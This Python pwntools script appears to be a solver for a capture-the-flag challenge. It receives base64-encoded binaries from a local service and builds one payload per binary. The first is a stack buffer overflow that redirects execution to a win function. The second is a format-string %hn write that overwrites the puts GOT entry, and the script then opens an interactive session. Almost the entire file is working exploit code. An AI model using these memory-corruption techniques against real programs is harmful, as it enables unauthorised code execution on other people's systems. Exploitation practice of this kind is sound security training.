from pwn import *
from base64 import b64decode
from subprocess import run, PIPE


def exploitVuln1(base64Program):
    binaryName = "./vuln1"
    binary = b64decode(base64Program)
    f = open(binaryName, "wb")
    f.write(binary)
    f.close()
    elf = context.binary = ELF(binaryName)
    winFunction = elf.symbols['winFunction']
    print("winFunction: "+hex(winFunction))
    payload = ("a"*256).encode() + p64(0xdeadbeefc0fec0de) + p64(winFunction)
    os.remove(binaryName)
    return payload


def exploitVuln2(base64Program):
    binaryName = "./vuln2"
    binary = b64decode(base64Program)
    f = open(binaryName, "wb")
    f.write(binary)
    f.close()
    elf = context.binary = ELF(binaryName)
    winFunction = elf.symbols['winFunction']
    print("winFunction: "+hex(winFunction))
    puts = elf.got['puts']
    print("puts: "+hex(puts))
    current = 0
    first = winFunction & 0xff
    second = (winFunction & 0xff00) >> 8
    third = (winFunction & 0xff0000) >> 16
    fourth = (winFunction & 0xff000000) >> 24

    def getNextNum(current, num):
        num = (num - current) & 0xFFFF
        current = num + current
        if num < 0:
            num = num + 0xff
        num = str(num).zfill(4)
        return current, num
    current, first = getNextNum(current, first)
    current, second = getNextNum(current, second)
    current, third = getNextNum(current, third)
    current, fourth = getNextNum(current, fourth)

    i = 18
    payload = f"%{first}c%{i}$hn%{second}c%{i+1}$hn%{third}c%{i+2}$hn%{fourth}c%{i+3}$n%{i+4}$n%{i+5}$n"
    alignPadding = (8 - (len(payload) % 8))*b"\00"
    payload = payload.encode() + alignPadding + p64(puts) + p64(puts+1) + \
        p64(puts+2) + p64(puts+3) + p64(puts+5) + p64(puts+6)
    os.remove(binaryName)
    return payload


remoteUrl = "localhost"
remotePort = 1338

r = remote(remoteUrl, remotePort)

for i in range(0, 2):
    temp = r.readuntil("Base64 code:\n".encode())
    base64Program = r.readuntil("Base64 code end").decode()
    base64Program = base64Program[:-15].encode()
    payload = "Md5 not found".encode()

    if "What is your name my friend".encode() in b64decode(base64Program):
        print("Vuln 1 function")
        payload = exploitVuln1(base64Program)
    elif "What is your name".encode() in b64decode(base64Program):
        print("Vuln 2 function")
        payload = exploitVuln2(base64Program)
    print("Sending: {}".format(payload))
    r.sendlineafter("Enter your payload:", payload)
r.interactive()
